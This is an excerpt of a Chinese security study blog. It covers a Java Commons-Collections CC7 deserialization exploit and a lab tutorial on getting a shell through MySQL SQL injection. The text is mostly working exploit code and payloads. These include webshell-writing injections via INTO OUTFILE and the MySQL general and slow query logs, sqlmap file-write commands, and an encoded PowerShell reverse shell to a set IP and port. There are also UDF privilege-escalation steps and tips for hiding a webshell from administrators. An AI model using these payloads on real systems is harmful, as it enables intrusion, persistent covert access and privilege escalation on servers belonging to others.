class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h3><h4 id="CC7分析"><a href="#CC7分析" class="headerlink" title="CC7分析"></a>CC7分析</h4><p>直接看yso给出的链条，后半部分还是从<code>LazyMap.get()</code>入手，前面部分从前看，这次用到的是<code>hashtable</code>，他的readObject里有一个<code>reconstitutionPut</code>，调用到<code>AbstractMapDecorator.equals</code>-&gt;<code>AbstractMap.equals</code>-&gt;<code>LazyMap.get()</code></p>
<p>流程还是比较直观的，比较难的是要控制里面<code>e.key</code>之类的这些值，后面编写exp的时候再解决</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224195150.png" ></p>
<h4 id="EXP编写-2"><a href="#EXP编写-2" class="headerlink" title="EXP编写"></a>EXP编写</h4><p>前面部分直接搬前面CC1的（要多回顾，不然容易忘了），后面跳过<code>AbstractMapDecorator</code>，尝试直接引入hashtable</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 前面部分都和CC1一样</span></span><br><span class="line">    HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">decoratedMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 引入hashtable</span></span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    hashtable.put(decoratedMap,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    serialize(hashtable);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按理说这样是没问题的，引入了hashtable，把LazyMap也包了进去，但是没有如愿弹出计算机</p>
<p>尝试打一个断点，发现在hashtable里<code>reconstitutionPut</code>连for循环都没有进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224195650.png" ></p>
<p>hashtable的触发要满足一些条件，还挺复杂的，先看最终代码再一个一个解释为什么吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">decorateMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);</span><br><span class="line">    decorateMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">decorateMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">    decorateMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    hashtable.put(decorateMap1, <span class="number">1</span>);</span><br><span class="line">    hashtable.put(decorateMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ChainedTransformer.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(chainedTransformer, transformers);</span><br><span class="line">    decorateMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    serialize(hashtable);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><p>readObject先创建一个Entry，然后进入for循环读取key，value，顺便调用<code>reconstitutionPut</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224205011.png" ></p>
<p>进入到这个方法后首先通过key计算一个hash值，用这个hash再计算出一个index，这个index是前面readObject里面创建的Entry的索引。</p>
<p>然后判断当前索引处是否有对象，如果有，就进入for循环判断两个对象是否相等，如果没有，通过当前key的hash，以及key,value,和当前数组节点的Entry新建一个Entry挂入当前索引处。</p>
<p>所以我们需要让Entry数组<code>当前索引处的对象哈希</code>&#x3D;<code>将要挂入的对象哈希</code>，这样才能调用<code>e.key.equals</code>从而进入我们的调用链。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224204741.png" ></p>
<ul>
<li>为什么有两个decorateMap，为什么分别给他们的key这么赋值</li>
</ul>
<p><code>reconstitutionPut</code>是被遍历调用，第一次调用的时候<code>tab[index]</code>内容是空的，在方法最下面会给它赋一个值。第二次进入这个方法后它就不是空，此时的变量分别是</p>
<blockquote>
<p>tab[index] -&gt; 在上一轮for被赋值后，可以把它当成decorateMap1<br>e -&gt; decorateMap2<br>而第二次调用reconstitutionPut的时候传入的key value对应decorateMap2的key value</p>
</blockquote>
<p>所以为了判断能够进入<code>e.key.equals(key)</code>，要先使<code>e.hash == hash</code></p>
<blockquote>
<p>decorateMap1.hash -&gt; decorateMap1.key.hashcode()</p>
</blockquote>
<p>也就是<u>decorateMap1</u>和<u>decorateMap2</u>两个的key作hashcode()处理后的值相等才能过判断</p>
<p>这里利用到java的一个小bug，”yy”和”zZ”做hashcode处理后值是一样的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224213518.png" ></p>
<ul>
<li>为什么put之后要remove操作</li>
</ul>
<p>然后后面<code>HashTable.put()</code>会调用 <code>equals()</code>，调用完 <code>equals()</code>后，decorateMap2会多增加一个yy键，那就不能满足后面的判断了，删了！</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224214328.png" ></p>
<ul>
<li>为什么要反射修改<code>iTransformers</code>的值</li>
</ul>
<p>这个和之前的链子遇到的很像，put的过程中就会走到后面预期的链子，这个时候不想让他有反应，就先让操作对象里面没有要执行的的命令，先是个常数，后面再改回来</p>
<h4 id="主要参考"><a href="#主要参考" class="headerlink" title="主要参考"></a>主要参考</h4><p><a class="link"   href="https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE" >https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE" >http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p><strong>文章中有任何理解不对的地方，非常欢迎师傅指正🙏</strong></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>利用sql注入getshell</title>
    <url>/2025/02/25/%E5%88%A9%E7%94%A8sql%E6%B3%A8%E5%85%A5getshell/</url>
    <content><![CDATA[<p>感觉自己实操还有欠缺，刚好看到别的师傅有这个主题的博客，我也顺着写一篇笔记</p>
<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>直接用了之前上课用到的代码，很简单构造出一个有sql注入的环境</p>
<p>mysql用的是<code>5.1.60</code></p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Get查询&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;margin-top: 70px;color: black;font-size: 23px;text-align: center&quot;</span>&gt;</span><br><span class="line">    &lt;font color=<span class="string">&quot;#FF0000&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;con_database.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from books where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;sql语句执行失败&#x27;</span>.<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>));</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color = &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&#x27;Book name:&#x27;</span>.<span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Author:&#x27;</span>.<span class="variable">$row</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;请输入要查询的记录id&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;/font&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>很明显漏洞在这里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from books where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="Into-outfile写入文件"><a href="#Into-outfile写入文件" class="headerlink" title="Into outfile写入文件"></a>Into outfile写入文件</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>执行<code>INTO OUTFILE</code>操作的用户必须拥有<code>FILE</code>权限，也可以说是必须是root权限</li>
<li>知道当前网站的绝对路径，对应的路径有写入权限</li>
<li><code>PHP</code>的<code>GPC</code>为 off状态；(魔术引号，GET，POST，Cookie)</li>
<li>secure_file_priv 没有具体值</li>
</ul>
<blockquote>
<p>secure_file_priv 的值为null ，表示限制 mysqld 不允许导入|导出<br>secure_file_priv 的值为 &#x2F;tmp&#x2F; ，表示限制 mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下<br>secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
<p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
</blockquote>
<h5 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h5><p><strong>基于联合查询</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select &#x27;&lt;?php phpinfo(); ?&gt;&#x27;,NULL,NULL into outfile &#x27;C:/phpstudy_pro/WWW/1.php&#x27; --+ </span><br></pre></td></tr></table></figure>

<p><strong>非联合查询</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; into outfile &#x27;C:/phpstudy_pro/WWW/4.php&#x27; FIELDS TERMINATED BY &#x27;&lt;?php phpinfo();?&gt;&#x27; --+ </span><br></pre></td></tr></table></figure>

<p>空格可以用+号，<code>%0a</code>、<code>%0b</code>、<code>%a0</code> 、 &#x2F;**&#x2F; 注释符等代替</p>
<p><strong>sqlmap</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.64.145/sql/sql2-2?id=1&#x27; --file-write=/Users/lingtian/downloads/info.php --file-dest=&quot;C:\phpstudy_pro\WWW\3.php&quot;</span><br></pre></td></tr></table></figure>

<h5 id="Outfile和dumpfile的区别"><a href="#Outfile和dumpfile的区别" class="headerlink" title="Outfile和dumpfile的区别"></a>Outfile和dumpfile的区别</h5><p><strong>outfile</strong>:</p>
<blockquote>
<p>1、 支持多行数据同时导出</p>
<p>2、 使用union联合查询时，要保证两侧查询的列数相同</p>
<p>3、 会在换行符制表符后面追加反斜杠</p>
<p>4、会在末尾追加换行</p>
</blockquote>
<p><strong>dumpfile</strong>:</p>
<blockquote>
<p>1、 每次只能导出一行数据</p>
<p>2、 不会在换行符制表符后面追加反斜杠</p>
<p>3、 不会在末尾追加换行</p>
</blockquote>
<p>所以我们可以用dumpfile写入二进制文件，而用outfile写入的二进制文件最终会无法生效（追加的反斜杠会使二进制文件无法生效）</p>
<h4 id="利用日志写入webshell"><a href="#利用日志写入webshell" class="headerlink" title="利用日志写入webshell"></a>利用日志写入webshell</h4><ul>
<li>web文件夹权限宽松，可以接受写入新的东西</li>
<li>最好是windows系统</li>
<li>运行Mysql或Apache的是高权限</li>
</ul>
<p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">| Variable_name    | Value                                                           |</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">| general_log      | OFF                                                             |</span><br><span class="line">| general_log_file | C:\phpstudy_pro\Extensions\MySQL5.1.60\data\WINDOWS-M9UNPKC.log |</span><br><span class="line">+------------------+-----------------------------------------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>第一个参数需要<code>general_log</code>是ON的状态，这样mysql才会记录每一条记录，第二个参数<code>general_log_file</code>是日志的文件路径</p>
<p>如果要写入shell，两个参数都要修改，如果是注入，可以利用到堆叠注入</p>
<p>用到一个源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>)):</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br></pre></td></tr></table></figure>

<p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p>
<p>在windows用这个给文件夹权限设置宽松</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icacls &quot;C:\phpstudy_pro\WWW&quot;  /grant Everyone:(F) /T</span><br></pre></td></tr></table></figure>

<p>Linux是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod -R 777 /var/www/html</span><br></pre></td></tr></table></figure>

<p>如果遇到堆叠注入，payload可以这样写</p>
<p>先修改两个参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;;set global general_log = &quot;ON&quot;;set global general_log_file=&#x27;C:\phpstudy_pro\WWW\shell.php&#x27;;--+</span><br></pre></td></tr></table></figure>

<p>直接在数据库测试了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; set global general_log = &quot;ON&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SET GLOBAL general_log_file=&quot;C:\\phpstudy_pro\\WWW\\shell.php&quot;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+------------------+-------------------------------+</span><br><span class="line">| Variable_name    | Value                         |</span><br><span class="line">+------------------+-------------------------------+</span><br><span class="line">| general_log      | ON                            |</span><br><span class="line">| general_log_file | C:\phpstudy_pro\WWW\shell.php |</span><br><span class="line">+------------------+-------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>然后尝试写入shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;; select &#x27;&lt;?php eval(@$_GET[&#x27;a&#x27;]);?&gt;&#x27;</span><br></pre></td></tr></table></figure>

<p>写入后，注意这里要闭合好，不然没办法正常执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\phpstudy_pro\www&gt; type .\shell.php</span><br><span class="line">C:\phpstudy_pro\COM\..\Extensions\MySQL5.1.60\\bin\mysqld.exe, Version: 5.1.60-community (MySQL Community Server (GPL)). started with:</span><br><span class="line">TCP Port: 3306, Named Pipe: MySQL</span><br><span class="line">Time                 Id Command    Argument</span><br><span class="line">250226  1:14:58   260 Query     select &#x27;&lt;?php eval(@$_GET[&#x27;a&#x27;]);?&gt;&#x27;</span><br><span class="line">                  260 Query     show warnings</span><br></pre></td></tr></table></figure>

<p>尝试生存个powershell的payload也能成功反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/shell.php?a=system(%27powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADYANAAuADEAOAA3ACIALAAxADIAMwA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==%27);</span><br></pre></td></tr></table></figure>

<h5 id="慢查询"><a href="#慢查询" class="headerlink" title="慢查询"></a>慢查询</h5><p>思路是差不多的，修改的参数不一样而已</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%slow_query_log%&#x27;;		--查看慢查询信息</span><br><span class="line">set global slow_query_log=1;				--启用慢查询日志(默认禁用)</span><br><span class="line">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;	--修改日志文件路径</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[abc]);?&gt;&#x27; or sleep(11);				--写shell</span><br></pre></td></tr></table></figure>

<p>为什么要用慢查询，只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志，一般都是通过<code>long_query_time</code>选项来设置这个时间值，时间以秒为单位，可以精确到微秒。</p>
<p>通常情况下执行<code>sql</code>语句时的执行时间一般不会超过10s，所以说这个日志文件应该是比较小的，而且默认也是禁用状态，不会引起管理员的察觉。拿到shell后上传一个新的shell，删掉原来shell，新shell做隐藏，这样shell可能还能活的时间长些</p>
<h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><p>在MySQL&gt;&#x3D;5.1的版本，我们可以创建自定义函数的方式来执行恶意代码，添加的函数可以在select中使用，就像使用version()一样方便</p>
<p>sqlmap和Metasploit都提供了动态链接库，直接用就行</p>
<p>这次用的版本是<code>5.7.26</code></p>
<h5 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">+---------------+---------------------------------------------------+</span><br><span class="line">| Variable_name | Value                                             |</span><br><span class="line">+---------------+---------------------------------------------------+</span><br><span class="line">| plugin_dir    | C:\phpstudy_pro\Extensions\MySQL5.7.26\lib/plugin |</span><br><span class="line">+---------------+---------------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>

<h5 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h5><p>secure_file_priv 要是<strong>空的！空的！空的！</strong></p>
<p>如果有sql注入且是高权限，plugin目录可写，secure_file_priv 无限制，这个时候可以直接用sqlmap跑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.64.145/sql/sql2-2?id=1&#x27; --file-write=/Users/lingtian/downloads/lib_mysqludf_sys_64.dll --file-dest=&#x27;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf1.dll&#x27;</span><br></pre></td></tr></table></figure>

